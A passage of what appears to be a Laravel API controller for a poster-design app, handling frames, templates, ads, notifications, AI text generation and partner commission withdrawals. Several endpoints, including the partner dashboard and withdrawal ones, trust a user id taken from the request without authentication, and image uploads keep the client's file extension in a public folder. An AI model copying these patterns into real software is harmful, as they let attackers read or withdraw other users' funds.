                    $referral_user = User::find($req->user_id);

                    if($req->withdraw_amount <= $referral_user->current_balance)
                    {
                        $referral_user = User::find($req->user_id);
                        $referral_user->current_balance = $referral_user->current_balance - $req->withdraw_amount;
                        $referral_user->save();
                
                        EarningHistory::create([
                            "user_id" => $referral_user->id,
                            "amount" => $req->withdraw_amount,
                            "amount_type" => 0,
                            "refer_user" => $referral_user->id,
                        ]);
                    }

                    return response()->json([
                        'status' => "success",
                        'message' => "Withdraw Request Send Successfully!",
                    ], 200);
                }
                else
                {
                    return response()->json([
                        'status' => "Error",
                        'message' => "Withdraw Limit ".ReferralSystem::getReferralSystem('withdrawal_limit'),
                    ], 404);
                }
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "Invalid User Id",
                ], 404);
            }
        }
    }

    public function posterCategory()
    {
        $category = PosterCategory::where('status',1)->get();

        if(!$category->isEmpty())
        {
            foreach ($category as $cat) {
                $data[] = array(
                    "frameCategoryId" => $cat->id,
                    "frameCategoryName" => $cat->name,
                );
            }
            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function getPosterJson(Request $request)
    {
        $poster = PosterMaker::get();
        if(!$poster->isEmpty())
        {
            foreach($poster as $p)
            {
                // ── RENDER V4: Prefer DB-stored layers_json over disk file I/O ──
                // layers_json is a column on the same poster_maker row (already loaded, ZERO extra queries)
                if (!empty($p->layers_json)) {
                    $json_data = is_string($p->layers_json) ? $p->layers_json : json_encode($p->layers_json);
                } else {
                    $json_data = $this->resolveTemplateJson($p->zip_name, $p->id, 'poster') ?? '';
                }

                $data[] = array(
                    "category_name" => $p->poster_category->name,
                    "name" => $p->zip_name,
                    "ratio" => $p->template_type,
                    "thumbnail" => ($p->post_thumb)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$p->post_thumb):asset('uploads/'.$p->post_thumb)):"",
                    "is_paid" => ($p->paid==1)?true:false,
                    "theme" => $p->theme ?? 'all',
                    "req_address" => $p->req_address ?? 0,
                    "req_email" => $p->req_email ?? 0,
                    "req_phone" => $p->req_phone ?? 0,
                    "req_website" => $p->req_website ?? 0,
                    "json" => $json_data,
                    "templateBaseUrl" => ($p->zip_name)?$this->getTemplateBaseUrl($p->zip_name):"",
                    "render_version" => $p->render_version ?? 1,
                    "updated_at" => $p->updated_at?->toIso8601String() ?? null,
                );
            }

            $userId = $request->userId ?? (auth('sanctum')->id() ?? auth()->id());
            if ($userId && isset($data)) {
                $userBusiness = \App\Models\Business::where('user_id', $userId)->where('is_default', 1)->first() 
                             ?? \App\Models\Business::where('user_id', $userId)->first();
                if ($userBusiness) {
                    $mainController = app(\App\Http\Controllers\MainController::class);
                    $data = $mainController->filterFramesByBusinessData($data, $userBusiness);
                }
            }

            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function from_camel_case($str)
    {
        $i = array("-","_");
        $str = preg_replace('/([a-z])([A-Z])/', "\\1 \\2", $str);
        $str = preg_replace('@[^a-zA-Z0-9\-_ ]+@', '', $str);
        $str = str_replace($i, ' ', $str);
        $str = str_replace(' ', '', ucwords(strtolower($str)));
        $str = strtolower(substr($str,0,1)).substr($str,1);
        return $str;
    }

    private function upload_image($file,$field,$id)
    {
        $destinationPath = public_path('uploads');
        $extension = $file->getClientOriginalExtension();
        $fileName = Str::uuid() . '.' . $extension;
        $file->move($destinationPath, $fileName);
        
        $image = Business::find($id);
        $image->$field = $fileName;
        $image->save();
    }

    public function phonepe_callback(Request $request)
    {
        try {
            $responseData = ['status' => 200, 'message' => 'Phonepe event received successfully'];
            return response()->json($responseData, 200);
        } catch (\Throwable $th) {
            $responseData = ['status' => 200, 'message' => 'Phonepe event received successfully'];
            return response()->json($responseData, 200);
        }
    }

    /**
     * SaaS Feature Consumption Endpoint.
     * Called by Flutter after a user downloads/uses a feature.
     * Also supports AdMob Rewarded Video extension: if 'ad_rewarded' is true,
     * the user watched an ad and gets +1 usage even if their limit was reached.
     */
    public function consumeFeature(Request $request)
    {
        $user = auth('sanctum')->user() ?: auth()->user();
        if (!$user) {
            return response()->json(['success' => false, 'message' => 'Unauthorized'], 401);
        }

        $feature = $request->get('feature');
        $validFeatures = ['custom_post', 'festival_post', 'category_post'];

        if (!$feature || !in_array($feature, $validFeatures)) {
            return response()->json(['success' => false, 'message' => 'Invalid feature key.'], 422);
        }

        // Do not consume limit if the template is free
        $isPaid = filter_var($request->get('is_paid', true), FILTER_VALIDATE_BOOLEAN);
        if (!$isPaid) {
            return response()->json([
                'success' => true,
                'message' => 'Free template — no limit consumed.',
                'is_free' => true,
            ]);
        }

        // Check if this is an ad-rewarded extension request
        $isAdRewarded = $request->get('ad_rewarded', false);

        if ($isAdRewarded) {
            // User watched an AdMob Rewarded Video — verify their plan allows ad rewards for this feature
            if ($user->isAdRewardEnabledForFeature($feature)) {
                // Track that they watched an ad
                $user->consumeAdReward($feature);

                // Grant +1 usage by NOT checking limit, just consuming directly
                $fieldMap = [
                    'custom_post'            => 'custom_post_used',
                    'festival_post'          => 'festival_post_used',
                    'category_post' => 'category_post_used',
                ];
                // Reset the used counter by 1 to allow one more use
                if ($user->{$fieldMap[$feature]} > 0) {
                    $user->decrement($fieldMap[$feature]);
                }

                return response()->json([
                    'success' => true,
                    'message' => 'Ad reward applied! You unlocked 1 more use.',
                    'remaining' => $user->getRemainingUsage($feature),
                    'ad_reward_enabled' => true,
                ]);
            } else {
                return response()->json([
                    'success' => false,
                    'message' => 'Ad rewards are not available or you have reached your monthly rewarded ad limit for this feature. Please upgrade.',
                    'ad_reward_enabled' => false,
                ], 403);
            }
        }

        // Normal consumption flow
        $consumed = $user->consumeFeature($feature);

        if ($consumed) {
            return response()->json([
                'success' => true,
                'message' => 'Feature consumed successfully.',
                'remaining' => $user->getRemainingUsage($feature),
                'ad_reward_enabled' => $user->isAdRewardEnabledForFeature($feature),
            ]);
        } else {
            $isAdEnabled = $user->isAdRewardEnabledForFeature($feature);
            return response()->json([
                'success' => false,
                'is_limit_reached' => true,
                'feature' => $feature,
                'ad_reward_enabled' => $isAdEnabled,
                'message' => $isAdEnabled
                    ? 'Limit reached. Watch an ad to unlock more.'
                    : 'Limit reached. Please upgrade your plan.',
            ], 403);
        }
    }

    /**
     * Get frames for a specific festival/category/custom post.
     * Matches the web's universal_details controller logic.
     * Usage: GET /get-frames?type=festival&id=5
     */
    public function getFrames(Request $request)
    {
        $type = $request->get('type');
        $id = $request->get('id');
        
        if (!$type || !$id) {
            return response()->json(['status' => 'Error', 'message' => 'type and id are required'], 400);
        }

        $frames_data = [];
        $videos_data = [];
        $item_name = '';
        $item_image = '';

        // Fetch videos for this specific type and ID
        $videosQuery = \App\Models\Video::where('status', 1);
        if ($type == 'festival') {
            $videosQuery->where('type', 'festival')->where('festival_id', $id);
        } elseif ($type == 'category') {
            $videosQuery->where('type', 'category')->where('category_id', $id);
        } elseif ($type == 'custom') {
            $videosQuery->where('type', 'businessCategory')->where('business_category_id', $id);
        } else {
            $videosQuery->whereRaw('1 = 0');
        }
        $videos = $videosQuery->get();
        
        foreach ($videos as $video) {
            $videos_data[] = [
                'videoId' => $video->id,
                'videoUrl' => (StorageSetting::getStorageSetting('storage') == 'DigitalOcean') ? Storage::disk('spaces')->url('uploads/video/'.$video->video) : asset('uploads/video/'.$video->video),
                'isPaid' => ($video->paid == 1) ? true : false,
            ];
        }

        if ($type == 'festival') {
            $item = Festivals::find($id);
            if (!$item) {
                return response()->json(['status' => 'Error', 'message' => 'Festival not found'], 404);
            }
            $item_name = $item->title;
            $item_image = ($item->image) ? ((StorageSetting::getStorageSetting('storage') == 'DigitalOcean') ? Storage::disk('spaces')->url('uploads/'.$item->image) : asset('uploads/'.$item->image)) : '';
            
            $frames = FestivalsPost::where('festivals_id', $id)->where('status', 1)->orderBy('id', 'desc')->get();
            foreach ($frames as $f) {
                $frames_data[] = [
                    'frameId' => $f->id,
                    'type' => 'festival',
                    'image' => ($f->frame_image) ? ((StorageSetting::getStorageSetting('storage') == 'DigitalOcean') ? Storage::disk('spaces')->url('uploads/'.$f->frame_image) : asset('uploads/'.$f->frame_image)) : '',
                    'language' => $f->language ? $f->language->title : 'All',
                    'languageId' => $f->language_id,
                    'isPaid' => ($f->paid == 1) ? true : false,
                    'isAi' => ($f->is_ai == 1) ? true : false,
                    'height' => $f->height,
                    'width' => $f->width,
                    'imageType' => $f->image_type,
                    'aspectRatio' => $f->aspect_ratio,
                ];
            }
        } elseif ($type == 'category') {
            $item = Category::find($id);
            if (!$item) {
                return response()->json(['status' => 'Error', 'message' => 'Category not found'], 404);
            }
            $item_name = $item->name;
            $item_image = ($item->icon) ? ((StorageSetting::getStorageSetting('storage') == 'DigitalOcean') ? Storage::disk('spaces')->url('uploads/'.$item->icon) : asset('uploads/'.$item->icon)) : '';
            
            $frames = CategoryPost::where('category_id', $id)->where('status', 1)->orderBy('id', 'desc')->get();
            foreach ($frames as $c) {
                $frames_data[] = [
                    'frameId' => $c->id,
                    'type' => 'category',
                    'image' => ($c->frame_image) ? ((StorageSetting::getStorageSetting('storage') == 'DigitalOcean') ? Storage::disk('spaces')->url('uploads/'.$c->frame_image) : asset('uploads/'.$c->frame_image)) : '',
                    'language' => $c->language ? $c->language->title : 'All',
                    'languageId' => $c->language_id,
                    'isPaid' => ($c->paid == 1) ? true : false,
                    'isAi' => ($c->is_ai == 1) ? true : false,
                    'height' => $c->height,
                    'width' => $c->width,
                    'imageType' => $c->image_type,
                    'aspectRatio' => $c->aspect_ratio,
                ];
            }
        } elseif ($type == 'custom') {
            $item = \App\Models\CustomPost::find($id);
            if (!$item) {
                return response()->json(['status' => 'Error', 'message' => 'Custom post not found'], 404);
            }
            $item_name = $item->name;
            $item_image = ($item->icon) ? ((StorageSetting::getStorageSetting('storage') == 'DigitalOcean') ? Storage::disk('spaces')->url('uploads/'.$item->icon) : asset('uploads/'.$item->icon)) : '';
            
            $frames = \App\Models\CustomPostFrame::where('custom_post_id', $id)->where('status', 1)->orderBy('id', 'desc')->get();
            foreach ($frames as $cc) {
                $zip_name = $cc->zip_name ?? '';
                $json_data = '';
                if ($zip_name) {
                    $json_data = $this->resolveTemplateJson($zip_name, null, 'custom') ?? '';
                }
                $image_val = ($cc->frame_image) ? ((StorageSetting::getStorageSetting('storage') == 'DigitalOcean') ? Storage::disk('spaces')->url('uploads/'.$cc->frame_image) : asset('uploads/'.$cc->frame_image)) : '';
                if(empty($image_val) && $zip_name) {
                    if(StorageSetting::getStorageSetting('storage') == 'DigitalOcean') {
                        $image_val = Storage::disk('spaces')->url('uploads/template/'.$zip_name.'/preview.jpg');
                    } else {
                        if(file_exists('./uploads/template/'.$zip_name.'/preview.jpg')) {
                            $image_val = asset('uploads/template/'.$zip_name.'/preview.jpg');
                        }
                    }
                }

                $frames_data[] = [
                    'frameId' => $cc->id,
                    'type' => 'custom',
                    'image' => $image_val,
                    'language' => $cc->language ? $cc->language->title : 'All',
                    'languageId' => $cc->language_id ?? 0,
                    'isPaid' => ($cc->paid == 1) ? true : false,
                    'height' => $cc->height,
                    'width' => $cc->width,
                    'imageType' => $cc->image_type,
                    'aspectRatio' => $cc->aspect_ratio,
                    'zipName' => $zip_name,
                    'json' => $json_data,
                    'templateBaseUrl' => ($zip_name)?$this->getTemplateBaseUrl($zip_name):"",
                    'render_version' => $cc->render_version ?? 1,
                    'updated_at' => $cc->updated_at?->toIso8601String() ?? null,
                ];
            }
        } elseif ($type == 'business_custom') {
            // Business Custom Frames (from CustomFramePurpose)
            $custom_frame = \App\Models\BusinessCustomFrame::where('custom_frame_purpose_id', $id)->where('status', 1)->orderBy('id', 'desc')->get();
            foreach ($custom_frame as $frame) {
                $zip_name = pathinfo($frame->zip_file_path ?? '', PATHINFO_FILENAME);
                $preview_img = '';
                if ($zip_name) {
                    if (StorageSetting::getStorageSetting('storage') == 'DigitalOcean') {
                        $preview_img = Storage::disk('spaces')->url('uploads/template/'.$zip_name.'/preview.jpg');
                    } else {
                        $dir = public_path('uploads/template/'.$zip_name.'/');
                        if (is_dir($dir)) {
                            if (file_exists($dir.'preview.jpg')) {
                                $preview_img = asset('uploads/template/'.$zip_name.'/preview.jpg');
                            } elseif (file_exists($dir.'preview.png')) {
                                $preview_img = asset('uploads/template/'.$zip_name.'/preview.png');
                            } else {
                                $files = glob($dir . '*.{jpg,jpeg,png}', GLOB_BRACE);
                                if (!empty($files)) {
                                    $preview_img = asset('uploads/template/'.$zip_name.'/'.basename($files[0]));
                                }
                            }
                        }
                    }
                }
                $frames_data[] = [
                    'frameId' => $frame->id,
                    'type' => 'business_custom',
                    'image' => $preview_img,
                    'language' => 'All',
                    'languageId' => 0,
                    'isPaid' => false,
                    'height' => $frame->height ?? 1080,
                    'width' => $frame->width ?? 1080,
                    'imageType' => 'square',
                    'aspectRatio' => '1:1',
                    'zipName' => $zip_name,
                    'templateBaseUrl' => ($zip_name)?$this->getTemplateBaseUrl($zip_name):"",
                    'render_version' => $frame->render_version ?? 1,
                    'updated_at' => $frame->updated_at?->toIso8601String() ?? null,
                ];
            }
            $item_name = 'Custom Templates';
            $item_image = '';
        }

        return response()->json([
            'itemName' => $item_name,
            'itemImage' => $item_image,
            'frames' => $frames_data,
            'videos' => $videos_data,
            'totalFrames' => count($frames_data),
        ], 200);
    }

    /**
     * Get Ad Configuration for the Flutter app.
     * Serves all AdMob/network settings from the ads_setting table
     * so the admin can control ad unit IDs and enable/disable flags
     * server-side without requiring an app update.
     *
     * Usage: GET /ad-config
     */
    public function getAdConfig()
    {
        $settings = \Illuminate\Support\Arr::pluck(
            AdsSetting::all()->toArray(), 'key_value', 'key_name'
        );

        return response()->json([
            'admob' => [
                'enabled'               => $settings['ads_enable'] ?? '0',
                'app_id_android'        => $settings['publisher_id'] ?? '',
                'app_id_ios'            => $settings['publisher_id'] ?? '',
                'banner_id_android'     => $settings['banner_ads_id'] ?? '',
                'banner_id_ios'         => $settings['banner_ads_id'] ?? '',
                'interstitial_id_android' => $settings['interstitial_ads_id'] ?? '',
                'interstitial_id_ios'   => $settings['interstitial_ads_id'] ?? '',
                'rewarded_id_android'   => $settings['rewarded_ads_id'] ?? '',
                'rewarded_id_ios'       => $settings['rewarded_ads_id'] ?? '',
                'native_id_android'     => $settings['native_ads_id'] ?? '',
                'native_id_ios'         => $settings['native_ads_id'] ?? '',
            ],
            'meta_audience' => [
                'enabled'    => $settings['meta_ads_enable'] ?? '0',
                'app_id'     => $settings['meta_ads_app_id'] ?? '',
            ],
            'applovin' => [
                'enabled'    => $settings['applovin_enable'] ?? '0',
                'sdk_key'    => $settings['applovin_sdk_key'] ?? '',
            ],
            'frequency_cap' => [
                'interstitial_cooldown_minutes' => $settings['interstitial_cooldown_minutes'] ?? '10',
                'max_interstitials_per_day'     => $settings['max_interstitials_per_day'] ?? '5',
            ],
        ], 200);
    }

    public function getNotifications()
    {
        $user = auth('sanctum')->user();
        $notifications = UserNotification::query()
            // Older admin broadcasts have no user_id and stay visible to all.
            // A personal notification (such as Festival AI completion) is only
            // ever returned to its owning authenticated user.
            ->when(
                $user,
                fn ($query) => $query->where(fn ($owned) => $owned
                    ->whereNull('user_id')
                    ->orWhere('user_id', $user->id)
                ),
                fn ($query) => $query->whereNull('user_id')
            )
            ->orderBy('created_at', 'desc')
            ->get();
        $data = [];
        foreach ($notifications as $n) {
            $data[] = [
                'id' => $n->id,
                'title' => $n->title,
                'message' => $n->message,
                'image' => ($n->image) ? ((StorageSetting::getStorageSetting('storage') == 'DigitalOcean') ? Storage::disk('spaces')->url('uploads/' . $n->image) : asset('uploads/' . $n->image)) : "",
                'type' => $n->type,
                'type_id' => $n->type_id,
                'external_link' => $n->external_link,
                'created_at' => $n->created_at->toDateTimeString(),
            ];
        }
        return response()->json($data, 200);
    }

    public function getPartnerDashboard(Request $request)
    {
        $userId = $request->userId;
        $user = User::find($userId);

        if (!$user || !$user->is_partner) {
            return response()->json([
                'status' => 'Error',
                'message' => 'User is not a partner or invalid user.',
            ], 404);
        }

        $hold_days = \App\Models\ReferralSystem::getReferralSystem('partner_refund_hold_days') ?? 7;
        
        $transactions = \App\Models\Transaction::where('partner_id', $userId)
                        ->where('status', '!=', 'Failed')
                        ->orderBy('created_at', 'desc')
                        ->get();

        $total_earnings = 0;
        $approved_balance = 0;
        $pending_balance = 0;
        $history = [];

        foreach ($transactions as $t) {
            $total_earnings += $t->partner_commission_amount;

            $is_past_hold = strtotime($t->created_at . ' + ' . $hold_days . ' days') <= time();
            
            if ($t->partner_commission_status == 'pending') {
                if ($is_past_hold) {
                    $t->partner_commission_status = 'approved';
                    $t->save();
                    $approved_balance += $t->partner_commission_amount;
                } else {
                    $pending_balance += $t->partner_commission_amount;
                }
            } else if ($t->partner_commission_status == 'approved') {
                $approved_balance += $t->partner_commission_amount;
            }

            $history[] = [
                'transaction_id' => $t->id,
                'coupon_code' => $t->couponCode ? $t->couponCode->code : 'Unknown',
                'amount' => $t->partner_commission_amount,
                'status' => $t->partner_commission_status,
                'date' => $t->created_at->format('Y-m-d H:i:s'),
                'is_withdrawable' => $is_past_hold
            ];
        }

        // Subtract withdrawn amount from approved balance
        $withdrawals = \App\Models\WithdrawRequest::where('user_id', $userId)->sum('withdraw_amount');
        $available_to_withdraw = $approved_balance - $withdrawals;

        return response()->json([
            'status' => 'Success',
            'data' => [
                'total_earnings' => $total_earnings,
                'pending_balance' => $pending_balance,
                'approved_balance' => $approved_balance,
                'available_to_withdraw' => max(0, $available_to_withdraw),
                'total_withdrawn' => $withdrawals,
                'commission_percent' => $user->partner_commission_percent ?? \App\Models\ReferralSystem::getReferralSystem('partner_default_commission_percent') ?? 20,
                'history' => $history
            ]
        ], 200);
    }

    public function partnerWithdrawRequest(Request $request)
    {
        $userId = $request->userId;
        $amount = $request->amount;
        $upi_id = $request->upi_id; // Payment detail

        $user = User::find($userId);

        if (!$user || !$user->is_partner) {
            return response()->json([
                'status' => 'Error',
                'message' => 'User is not a partner or invalid user.',
            ], 404);
        }

        if ($amount < 1) {
             return response()->json([
                'status' => 'Error',
                'message' => 'Invalid amount.',
            ], 400);
        }

        $hold_days = \App\Models\ReferralSystem::getReferralSystem('partner_refund_hold_days') ?? 7;
        
        $transactions = \App\Models\Transaction::where('partner_id', $userId)
                        ->whereIn('partner_commission_status', ['approved', 'pending'])
                        ->get();

        $approved_balance = 0;
        foreach ($transactions as $t) {
            if ($t->partner_commission_status == 'pending') {
                $is_past_hold = strtotime($t->created_at . ' + ' . $hold_days . ' days') <= time();
                if ($is_past_hold) {
                    $t->partner_commission_status = 'approved';
                    $t->save();
                    $approved_balance += $t->partner_commission_amount;
                }
            } else if ($t->partner_commission_status == 'approved') {
                $approved_balance += $t->partner_commission_amount;
            }
        }

        $withdrawals = \App\Models\WithdrawRequest::where('user_id', $userId)->sum('withdraw_amount');
        $available_to_withdraw = $approved_balance - $withdrawals;

        if ($amount > $available_to_withdraw) {
            return response()->json([
                'status' => 'Error',
                'message' => 'Insufficient approved balance. Available: ' . $available_to_withdraw,
            ], 400);
        }

        \App\Models\WithdrawRequest::create([
            'user_id' => $userId,
            'withdraw_amount' => $amount,
            'upi_id' => $upi_id,
            'status' => 0 // Pending approval from admin
        ]);

        return response()->json([
            'status' => 'Success',
            'message' => 'Withdraw request submitted successfully.',
        ], 200);
    }

    public function generateAiContent(Request $request)
    {
        $userId = $request->get('userId');
        if (!$userId) {
            return response()->json(['success' => false, 'message' => 'Not authenticated'], 401);
        }

        $frameId = $request->input('frame_id');
        $productId = $request->input('product_id');
        $manualPrompt = $request->input('manual_prompt');
        $canvasLayers = $request->input('canvas_layers', []);
        $language = $request->input('language', 'English');

        \Log::info("Mobile AI Generate called", [
            'frame_id' => $frameId, 'user_id' => $userId, 
            'canvas_layers_count' => count($canvasLayers),
            'language' => $language
        ]);

        if (empty($canvasLayers)) {
            return response()->json(['success' => false, 'message' => 'No text layers found'], 400);
        }

        $content = \App\Services\CustomFrameAIService::generateManualContent(
            $frameId ? (int) $frameId : 0, 
            $userId, 
            $productId ? (int) $productId : null, 
            $manualPrompt,
            $canvasLayers,
            $language
        );

        if ($content === null) {
            $err = \App\Services\CustomFrameAIService::$lastLog['error'] ?? 'Unknown error';
            return response()->json(['success' => false, 'message' => 'Could not generate content: ' . $err], 500);
        }

        return response()->json([
            'success' => true,
            'content' => $content,
        ]);
    }

    public function getFaqs()
    {
        $faqs = KnowledgeBase::where('status', 1)->get(['id', 'question', 'answer', 'category']);
        
        $groupedFaqs = [];
        foreach ($faqs as $faq) {
            $cat = $faq->category ?: 'General';
            if (!isset($groupedFaqs[$cat])) {
                $groupedFaqs[$cat] = [];
            }
            $groupedFaqs[$cat][] = $faq;
        }

        return response()->json(['data' => $groupedFaqs]);
    }

    public function getBusinessProducts(Request $request)
    {
        $subCategoryId = $request->input('business_sub_category_id');
        $typeId = $request->input('business_type_id');

        if (!$subCategoryId && !$typeId) {
            return response()->json(['status' => 'Error', 'message' => 'business_sub_category_id or business_type_id is required'], 400);
        }

        $query = \App\Models\BusinessProduct::where('status', 1);

        if ($typeId) {
            $typeIds = is_string($typeId) ? explode(',', $typeId) : (is_array($typeId) ? $typeId : [$typeId]);
            $query->whereIn('business_type_id', $typeIds);
        } else {
            $subIds = is_string($subCategoryId) ? explode(',', $subCategoryId) : (is_array($subCategoryId) ? $subCategoryId : [$subCategoryId]);
            $query->whereIn('business_sub_category_id', $subIds)
                  ->whereNull('business_type_id');
        }

        $products = $query->get(['id', 'name', 'icon', 'keywords']);

        $data = [];
        $isDigitalOcean = StorageSetting::getStorageSetting('storage') == 'DigitalOcean';
        
        foreach ($products as $p) {
            $data[] = [
                'id' => $p->id,
                'name' => $p->name,
                'icon' => $p->icon ? ($isDigitalOcean ? Storage::disk('spaces')->url('uploads/'.$p->icon) : asset('uploads/'.$p->icon)) : '',
                'keywords' => $p->keywords,
            ];
        }

        return response()->json(['status' => 'Success', 'data' => $data]);
    }

    public function searchBusinessProducts(Request $request)
    {
        $subCategoryId = $request->input('business_sub_category_id'); // Can be array or string
        $typeId = $request->input('business_type_id'); // Can be array or string
        $searchQuery = $request->input('query');
        
        if (!$subCategoryId && !$typeId) {
            return response()->json(['status' => 'Error', 'message' => 'business_sub_category_id or business_type_id is required'], 400);
        }

        $query = \App\Models\BusinessProduct::where('status', 1);

        if ($typeId) {
            $typeIds = is_string($typeId) ? explode(',', $typeId) : (is_array($typeId) ? $typeId : [$typeId]);
            $query->whereIn('business_type_id', $typeIds);
        } else {
            $subIds = is_string($subCategoryId) ? explode(',', $subCategoryId) : (is_array($subCategoryId) ? $subCategoryId : [$subCategoryId]);
            $query->whereIn('business_sub_category_id', $subIds)
                  ->whereNull('business_type_id');
        }

        if (!empty($searchQuery)) {
            $query->where(function($q) use ($searchQuery) {
                $q->where('name', 'LIKE', "%{$searchQuery}%")
                  ->orWhere('keywords', 'LIKE', "%{$searchQuery}%");
            });
        }

        $products = $query->limit(100)->get(['id', 'name', 'icon', 'keywords']);

        $data = [];
        $isDigitalOcean = StorageSetting::getStorageSetting('storage') == 'DigitalOcean';
        
        foreach ($products as $p) {
            $data[] = [
                'id' => $p->id,
                'name' => $p->name,
                'icon' => $p->icon ? ($isDigitalOcean ? Storage::disk('spaces')->url('uploads/'.$p->icon) : asset('uploads/'.$p->icon)) : '',
            ];
        }

        return response()->json(['status' => 'Success', 'data' => $data]);
    }

    public function requestCustomProduct(Request $request)
    {
        $user = auth('sanctum')->user();
        if (!$user) {
            return response()->json(['status' => 'Error', 'message' => 'Authentication is required'], 401);
        }

        $userId = $user->id;
        $businessId = $request->input('business_id');
        $subCategoryId = $request->input('business_sub_category_id');
        $requestedName = $request->input('requested_name');

        if (!$userId || !$businessId || !$subCategoryId || !$requestedName) {
            return response()->json(['status' => 'Error', 'message' => 'Missing required fields'], 400);
        }

        if (!\App\Models\Business::whereKey($businessId)->where('user_id', $userId)->exists()) {
            return response()->json(['status' => 'Error', 'message' => 'Business not found'], 404);
        }

        $req = \App\Models\BusinessProductRequest::create([
            'business_id' => $businessId,
            'business_sub_category_id' => $subCategoryId,
            'requested_name' => $requestedName,
            'status' => 'pending'
        ]);

        return response()->json([
            'status' => 'Success', 
            'message' => 'Custom product requested successfully',
            'data' => [
                'id' => $req->id,
                'name' => $req->requested_name,
                'status' => $req->status,
            ]
        ]);
    }

    /**
     * Capture native computed values from the Flutter app after first render.
     * Called once per frame per version from the native editor.
     *
     * POST /api/golden-render/capture-native
     * Body: { frame_id, zip_name, render_version, native_computed: { layerName: { finalX, finalY, ... } } }
     */
    public function captureNativeGolden(Request $request)
    {
        $request->validate([
            'frame_id' => 'required|integer',
            'zip_name' => 'required|string',
            'render_version' => 'required|integer',
            'native_computed' => 'required|array',
        ]);

        // Only capture if no native_computed exists yet for this frame+version
        $existing = \App\Models\GoldenRender::where('frame_id', $request->frame_id)
            ->where('render_version', $request->render_version)
            ->first();

        if ($existing && !empty($existing->native_computed)) {
            return response()->json(['success' => true, 'message' => 'Native golden already captured']);
        }

        \App\Models\GoldenRender::capture(
            $request->frame_id,
            $request->zip_name,
            $request->render_version,
            [
                'native_computed' => $request->native_computed,
                'source' => $existing ? $existing->source : 'native_auto',
            ]
        );

        return response()->json(['success' => true, 'message' => 'Native golden captured']);
    }

    /**
     * Batch fetch template JSON for multiple templates in a single request.
     * Supports up to 20 templates per request.
     *
     * GET /api/templates/batch?zip_names=Name1,Name2,Name3
     * GET /api/templates/batch?ids=1,2,3
     */
    public function batchTemplates(Request $request)
    {
        $maxBatch = 20;

        // Accept either zip_names or ids
        $zipNames = $request->query('zip_names')
            ? explode(',', $request->query('zip_names'))
            : [];
        $ids = $request->query('ids')
            ? array_map('intval', explode(',', $request->query('ids')))
            : [];

        // Limit batch size
        $zipNames = array_slice($zipNames, 0, $maxBatch);
        $ids = array_slice($ids, 0, $maxBatch);

        $results = [];

        // Fetch by IDs
        if (!empty($ids)) {
            $frames = \App\Models\PosterMaker::whereIn('id', $ids)->get();
            foreach ($frames as $frame) {
                $jsonData = $this->resolveTemplateJson($frame->zip_name, $frame->id, 'poster');
                $results[] = [
                    'id' => $frame->id,
                    'zip_name' => $frame->zip_name,
                    'render_version' => $frame->render_version ?? 1,
                    'json' => $jsonData,
                    'templateBaseUrl' => $this->getTemplateBaseUrl($frame->zip_name),
                    'updated_at' => $frame->updated_at?->toIso8601String(),
                ];
            }
        }

        // Fetch by zip_names
        if (!empty($zipNames)) {
            $frames = \App\Models\PosterMaker::whereIn('zip_name', $zipNames)->get();
            foreach ($frames as $frame) {
                $jsonData = $this->resolveTemplateJson($frame->zip_name, $frame->id, 'poster');
                $results[] = [
                    'id' => $frame->id,
                    'zip_name' => $frame->zip_name,
                    'render_version' => $frame->render_version ?? 1,
                    'json' => $jsonData,
                    'templateBaseUrl' => $this->getTemplateBaseUrl($frame->zip_name),
                    'updated_at' => $frame->updated_at?->toIso8601String(),
                ];
            }
        }

        return response()->json([
            'success' => true,
            'count' => count($results),
            'templates' => $results,
        ]);
    }
}
